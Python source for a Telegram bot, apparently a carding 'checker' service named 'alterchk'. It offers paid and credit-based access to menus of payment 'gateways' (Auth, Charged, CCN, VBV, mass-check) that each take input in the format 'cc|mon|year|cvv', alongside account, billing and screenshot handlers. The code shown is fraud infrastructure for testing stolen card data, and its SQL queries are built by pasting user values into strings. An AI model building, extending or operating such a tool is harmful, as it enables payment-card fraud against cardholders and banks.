    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")

    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    import asyncio
    from pyppeteer import launch
    from pyppeteer.errors import PageError
    import os
    async def RequestScreenShot(url, ruta):
        logging.getLogger('pyppeteer').setLevel(logging.WARNING)
        try:
            browser = await launch()
            page = await browser.newPage()
            await page.goto(url=url)
            await page.waitFor('body', {'timeout': 5000})
            await page.screenshot({'path': ruta})
            return True
        except PageError:
            return
        finally:
            await browser.close()
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='upload_photo')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UrlGen = f"ScreenShot{random.randint(1,12)}-{random.randint(1,31)}-{random.randint(1800,2022)}.png"
    if VerMessage.startswith('https://'): url = VerMessage
    else: url = f"https://{VerMessage}"
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    RequestScreenShot = await RequestScreenShot(url=url, ruta=UrlGen)
    if not (RequestScreenShot):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>https://www.xxxxxx.com/</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
            await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if message.from_user.username == None : username = f"<a href='tg://user?id={message.from_user.id}'>No Username</a>"
    else : username = f'@{message.from_user.username}'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        one = InlineKeyboardButton('𝐂𝐥𝐞𝐚𝐧 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 🗑️', callback_data="Finish")
        repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
        await bot.send_photo(
            photo=open(UrlGen, 'rb'),
            chat_id=message.chat.id,
            caption=f"<b>↯ Link ↯ {VerMessage}\n↯ Screenshot by ↯ {username}</b>",
            reply_to_message_id=message.message_id,
            reply_markup=repmarkup)
        os.remove(UrlGen)
    except (TimeoutError, exceptions.RetryAfter, aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest) as e:
        await asyncio.sleep(e.value)
        return

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["info" ,"myacc", "me","acc"])
async def CMDMyacc(message: types.Message):
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)

    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    if message.reply_to_message != None:
        #print(message.reply_to_message.chat.type, message.reply_to_message.from_user.id, message.reply_to_message.chat.id)
        await CheckPRM(message.reply_to_message.chat.type, message.reply_to_message.from_user.id, message.reply_to_message.chat.id)
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
        except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.reply_to_message.from_user.id}', '{UserSince}')")
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))

        first_name = message.reply_to_message.from_user.first_name
        last_name = message.reply_to_message.from_user.last_name

        if message.reply_to_message.from_user.username == None : username = f"<a href='tg://user?id={message.reply_to_message.from_user.id}'>No Username</a>"
        else : username = f'@{message.reply_to_message.from_user.username}'
    else :
        #print(message.chat.type, message.from_user.id, message.chat.id)
        await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
        except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    
        first_name = message.from_user.first_name
        last_name = message.from_user.last_name

        if message.from_user.username == None : username = f"<a href='tg://user?id={message.from_user.id}'>No Username</a>"
        else : username = f'@{message.from_user.username}'

    if first_name == None: first_name = '-'
    if last_name == None: last_name = '-'

    UserID = result['ID']
    Status = result['Status']
    TimeAntiSpam = result['TimeAntiSpam']
    Creditos  = result['Creditos']
    Warnings = result['Warnings']
    UserBanned = result['UserBanned']
    Name = f"{first_name} {last_name}"

    try :
        one = InlineKeyboardButton('𝐌𝐲𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data="myaccount")
        repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
        await bot.send_message(
            chat_id=message.chat.id, 
            text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Name: <code>{Name}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ AntiSpam: <code>{TimeAntiSpam}s</code>\n↯ UserName: {username}\n↯ Warnings: <code>{Warnings}</code> | ↯ Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>",
            reply_to_message_id=message.message_id,
            reply_markup=repmarkup)
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
        return
    except aiogram.utils.exceptions.CantParseEntities:
        try :
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ AntiSpam: <code>{TimeAntiSpam}s</code>\n↯ UserName: {username}\n↯ Warnings: <code>{Warnings}</code> | ↯ Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup)
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

@dp.callback_query_handler()
async def challenge_callback(callback_query: CallbackQuery) :
    query_data = str(callback_query.data)
    query_id = callback_query.id
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    msg_id = callback_query.message.message_id
    user_name = callback_query.from_user.first_name
    try :
        replyuserid = callback_query.message.reply_to_message.from_user.id
    except AttributeError:
        print("ERROR REPLY USER ID")
        return
        
    if  query_data == 'myaccount' :
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        if callback_query.message.reply_to_message.reply_to_message != None :
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            if not callback_query.message.reply_to_message.reply_to_message.from_user.username : username = f"<a href='tg://user?id={callback_query.message.reply_to_message.reply_to_message.from_user.id}'>No Username</a>"
            else : username = f'@{callback_query.message.reply_to_message.reply_to_message.from_user.username}'
            callbackusid = callback_query.message.reply_to_message.reply_to_message.from_user.id

        else :
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))

            if not callback_query.message.reply_to_message.from_user.username : username = f"<a href='tg://user?id={callback_query.message.reply_to_message.from_user.id}'>No Username</a>"
            else : username = f'@{callback_query.message.reply_to_message.from_user.username}'
            callbackusid = callback_query.message.reply_to_message.from_user.id

        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{callbackusid}'")

        if len(CheckPremium) != 0 :
            resultprm = json.loads(json.dumps(CheckPremium[0]))
            NextBilling =  resultprm['NextBilling']
            FormatBilling =  resultprm['FormatBilling']
            UserID = result['ID']
            Status = result['Status']
            Creditos  = result['Creditos']

            birthdate = datetime.datetime.strptime(FormatBilling,'%Y-%m-%d')
            currentDate = datetime.datetime.today()

            remaining_days = (birthdate - currentDate).days
            #print(f"{birthdate} - {currentDate} = {remaining_days}")
            if (int(remaining_days) == 0) or (int(remaining_days) == -1): remaining_days = 'Today'
            elif (int(remaining_days) == 1) : remaining_days = '1 day'
            else :
                remaining_days = int(remaining_days) + 1
                remaining_days = f'{remaining_days} days'
            myaccountmsg = f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ NextBilling: <code>{NextBilling}</code> | ↯ Expired in: <code>{remaining_days}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ UserName: <b>{username}</b>\n- - - - - - - - - - - - - - - - - - - - -</b>"
        else :
            UserID = result['ID']
            Status = result['Status']
            Creditos  = result['Creditos']
            UserSince = result['UserSince']
            myaccountmsg = f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ UserName: <b>{username}</b>\n↯ UserSince: <code>{UserSince}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>"

        try :
            one = InlineKeyboardButton('[ ↩️ ] 𝐑𝐞𝐭𝐮𝐫𝐧', callback_data="Information")
            two = InlineKeyboardButton('𝗙𝗶𝗻𝗶𝘀𝗵', callback_data="Finish")
            repmarkup = InlineKeyboardMarkup(row_width=2).add(one,two)
            await bot.edit_message_text(
                chat_id=chat_id, 
                message_id=msg_id,
                text=myaccountmsg,
                reply_markup=repmarkup)
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
        except aiogram.utils.exceptions.MessageNotModified:
           return

    elif query_data == 'Information' :
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        if callback_query.message.reply_to_message.reply_to_message  != None :
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            first_name = callback_query.message.reply_to_message.reply_to_message.from_user.first_name
            last_name = callback_query.message.reply_to_message.reply_to_message.from_user.last_name
            if not first_name: first_name = '-'
            if not last_name: last_name = '-'
            if not callback_query.message.reply_to_message.reply_to_message.from_user.username: username = f"<a href='tg://user?id={callback_query.message.reply_to_message.reply_to_message.from_user.id}'>No Username</a>"
            else : username = f'@{callback_query.message.reply_to_message.reply_to_message.from_user.username}'
        else :
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{callback_query.message.reply_to_message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            first_name = callback_query.message.reply_to_message.from_user.first_name
            last_name = callback_query.message.reply_to_message.from_user.last_name

            if not first_name: first_name = '-'
            if not last_name: last_name = '-'
            if not callback_query.message.reply_to_message.from_user.username: username = f"<a href='tg://user?id={callback_query.message.reply_to_message.from_user.id}'>No Username</a>"
            else : username = f'@{callback_query.message.reply_to_message.from_user.username}'

        UserID = result['ID']
        Status = result['Status']
        TimeAntiSpam = result['TimeAntiSpam']
        Creditos  = result['Creditos']
        Warnings = result['Warnings']
        UserBanned = result['UserBanned']
        Name = f"{first_name} {last_name}"

        try :
            one = InlineKeyboardButton('𝐌𝐲𝐀𝐜𝐜𝐨𝐮𝐧𝐭', callback_data="myaccount")
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.edit_message_text(
                chat_id=chat_id, 
                message_id=msg_id,
                text=f'<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Name: <code>{Name}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ AntiSpam: <code>{TimeAntiSpam}s</code>\n↯ UserName: {username}\n↯ Warnings: <code>{Warnings}</code> | ↯ Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>',
                reply_markup=repmarkup)
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
        except aiogram.utils.exceptions.CantParseEntities:
            try :
                await bot.edit_message_text(
                    chat_id=chat_id, 
                    message_id=msg_id,
                    text=f'<b>- - - - - - - - - - - - - - - - - - - - -\n↯ UserID: <code>{UserID}</code>\n↯ Status: <code>{Status}</code>\n↯ Credits: <code>{Creditos} credit(s)</code>\n↯ AntiSpam: <code>{TimeAntiSpam}s</code>\n↯ UserName: {username}\n↯ Warnings: <code>{Warnings}</code> | ↯ Banned: <code>{UserBanned}</code>\n- - - - - - - - - - - - - - - - - - - - -</b>',
                    reply_markup=repmarkup)
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
    elif query_data == "Home":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        one = InlineKeyboardButton('⚾ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ⚾', callback_data="Gateways")
        two = InlineKeyboardButton('🛠️ 𝐓𝐨𝐨𝐥𝐬 🛠️', callback_data="Tools")
        three = InlineKeyboardButton('🧩 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐂𝐫𝐲𝐩𝐭𝐨 🧩', callback_data="Crypto")
        four = InlineKeyboardButton('🍔 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 ! 🍔', url="https://t.me/alterchk")
        five = InlineKeyboardButton('𝐅𝐢𝐧𝐢𝐬𝐡 !', callback_data="Finish")
        repmarkup = InlineKeyboardMarkup(row_width=5).add(one, two, three).add(four,five)
        try :
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b><i>Hello, To know my commands press any of the buttons!</i></b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "Gateways":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        uno = InlineKeyboardButton('𝐀𝐔𝐓𝐇 𝐆.', callback_data="Auth")
        dos = InlineKeyboardButton('𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐆.', callback_data="Charged")
        tres = InlineKeyboardButton('𝐂𝐂𝐍 𝐆.', callback_data="CCN")
        cuatro = InlineKeyboardButton('𝐕𝐁𝐕 𝐆.', callback_data="3D CHK")
        cinco = InlineKeyboardButton('𝐇𝐨𝐦𝐞', callback_data="Home")
        seis = InlineKeyboardButton('𝐌𝐀𝐒𝐒 𝐆.', callback_data="MASS")
        siete = InlineKeyboardButton('𝐅𝐢𝐧𝐢𝐬𝐡', callback_data="Finish")

        try :
            repmarkup = InlineKeyboardMarkup(row_width=7).add(uno,dos,tres,cuatro).add(cinco,seis,siete)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b><i>Hello, To know my commands press any of the buttons!</i></b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "Finish":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        try :
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
        except exceptions.MessageCantBeDeleted :
            print("ERROR IN DELETED")
    elif query_data == "Auth":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='br'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_br = Gateway['Status']
        fecha_br = Gateway['DateOFF']
        comment_br = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ph'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_st = Gateway['Status']
        fecha_st = Gateway['DateOFF']
        comment_st = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='pfw'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_pfw = Gateway['Status']
        fecha_pfw = Gateway['DateOFF']
        comment_pfw = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='any'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_any = Gateway['Status']
        fecha_any = Gateway['DateOFF']
        comment_any = Gateway['Mensaje']

        uno = InlineKeyboardButton('𝐍𝐞𝐱𝐭 𝐏𝐚𝐠𝐞 [ ➡️ ]', callback_data="NextPage2Auth")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=2).add(uno,dos)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 1\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Zarek [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_br} ]\nFormat: <code>$br cc|mon|year|cvv</code>\nComment: </b>{comment_br}\n<b>Update Since: </b>{fecha_br}\n<b>- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Phoenix [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_st} ]\nFormat: <code>$ph cc|mon|year|cvv</code>\nComment: </b>{comment_st}\n<b>Update Since: </b>{fecha_st}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>\n<b>Gateway 🔥 Poseidon [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_pfw} ]\nFormat: <code>$pfw cc|mon|year|cvv</code>\nComment: </b>{comment_pfw}\n<b>Update Since: </b>{fecha_pfw}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>\n<b>Gateway 🔥 Adyen [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_any} ]\nFormat: <code>$any cc|mon|year|cvv</code>\nComment: </b>{comment_any}\n<b>Update Since: </b>{fecha_any}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "NextPage2Auth":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='nashe'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_nashe = Gateway['Status']
        fecha_nashe = Gateway['DateOFF']
        comment_nashe = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='bra'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_bra = Gateway['Status']
        fecha_bra = Gateway['DateOFF']
        comment_bra = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ci'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_ci = Gateway['Status']
        fecha_ci = Gateway['DateOFF']
        comment_ci = Gateway['Mensaje']
        
        uno = InlineKeyboardButton('[ ↩️ ] 𝐏𝐫𝐞𝐯𝐢𝐨𝐮𝐬 𝐩𝐚𝐠𝐞', callback_data="Auth")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        tres = InlineKeyboardButton('[ ➡️ ] 𝐍𝐞𝐱𝐭 𝐩𝐚𝐠𝐞', callback_data="NextPage3Auth")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=3).add(uno,dos,tres)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 2\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Nashe [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_nashe} ]\nFormat: <code>$nashe cc|mon|year|cvv</code>\nComment: </b>{comment_nashe}\n<b>Update Since: </b>{fecha_nashe}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Baruch [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_bra} ]\nFormat: <code>$bra cc|mon|year|cvv</code>\nComment: </b>{comment_bra}\n<b>Update Since: </b>{fecha_bra}<b>\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Ciclope [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_ci} ]\nFormat: <code>$ci cc|mon|year|cvv</code>\nComment: </b>{comment_ci}\n<b>Update Since: </b>{fecha_ci}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "NextPage3Auth":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ric'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_ric = Gateway['Status']
        fecha_ric = Gateway['DateOFF']
        comment_ric = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='au'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_au = Gateway['Status']
        fecha_au = Gateway['DateOFF']
        comment_au = Gateway['Mensaje']
        uno = InlineKeyboardButton('[ ↩️ ] 𝐏𝐫𝐞𝐯𝐢𝐨𝐮𝐬 𝐩𝐚𝐠𝐞', callback_data="NextPage2Auth")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=2).add(uno,dos)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 3\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Rygel [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_ric} ]\nFormat: <code>$ric cc|mon|year|cvv</code>\nComment: </b>{comment_ric}\n<b>Update Since: </b>{fecha_ric}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>\n<b>Gateway 🔥 Auribe [ Auth ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_au} ]\nFormat: <code>$au cc|mon|year|cvv</code>\nComment: </b>{comment_au}\n<b>Update Since: </b>{fecha_au}<b>\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "Charged":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='sb'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_sb = Gateway['Status']
        fecha_sb = Gateway['DateOFF']
        comment_sb = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='saf'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_saf = Gateway['Status']
        fecha_saf = Gateway['DateOFF']
        comment_saf = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ki'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_ki = Gateway['Status']
        fecha_ki = Gateway['DateOFF']
        comment_ki = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='ab'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_ab = Gateway['Status']
        fecha_ab = Gateway['DateOFF']
        comment_ab = Gateway['Mensaje']

        uno = InlineKeyboardButton('𝐍𝐞𝐱𝐭 𝐏𝐚𝐠𝐞 [ ➡️ ]', callback_data="NextPage2Charged")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=2).add(uno,dos)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
                caption=f"<b>Page Number: 1\n- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Anubis [ 15$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_ab} ]\nFormat: <code>$ab cc|mon|year|cvv</code>\nComment: </b>{comment_ab}\n<b>Update Since: </b>{fecha_ab}\n<b>- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Syna [ 15$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_sb} ]\nFormat: <code>$sb cc|mon|year|cvv</code>\nComment: </b>{comment_sb}\n<b>Update Since: </b>{fecha_sb}\n<b>- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Safire [ 8$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_saf} ]\nFormat: <code>$saf cc|mon|year|cvv</code>\nComment: </b>{comment_saf}\n<b>Update Since: </b>{fecha_saf}\n<b>- - - - - - - - - - - - - - - - - - - - -\nGateway 🔥 Kyu [ 1$ ]\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {status_ki} ]\nFormat: <code>$ki cc|mon|year|cvv</code>\nComment: </b>{comment_ki}\n<b>Update Since: </b>{fecha_ki}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_markup=repmarkup)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)

    elif query_data == "NextPage2Charged":
        if replyuserid != user_id :
            await callback_query.answer("Oops, Access Denied, you are not the one using this command. ⚠️", show_alert=True)
            return
        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='rr'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_rr = Gateway['Status']
        fecha_rr = Gateway['DateOFF']
        comment_rr = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='pp'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_pp = Gateway['Status']
        fecha_pp = Gateway['DateOFF']
        comment_pp = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='chk'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_chk = Gateway['Status']
        fecha_chk = Gateway['DateOFF']
        comment_chk = Gateway['Mensaje']

        GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='kill'")
        Gateway = json.loads(json.dumps(GatewaysSearch[0]))
        status_kill = Gateway['Status']
        fecha_kill = Gateway['DateOFF']
        comment_kill = Gateway['Mensaje']

        uno = InlineKeyboardButton('[ ↩️ ] 𝐏𝐫𝐞𝐯𝐢𝐨𝐮𝐬 𝐩𝐚𝐠𝐞', callback_data="Charged")
        dos = InlineKeyboardButton('[ 🔙 ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬', callback_data="Gateways")
        tres = InlineKeyboardButton('[ ➡️ ] 𝐍𝐞𝐱𝐭 𝐩𝐚𝐠𝐞', callback_data="NextPage3Charged")
        try :
            repmarkup = InlineKeyboardMarkup(row_width=3).add(uno,dos,tres)
            await bot.edit_message_caption(
                chat_id=chat_id, 
                message_id=msg_id,
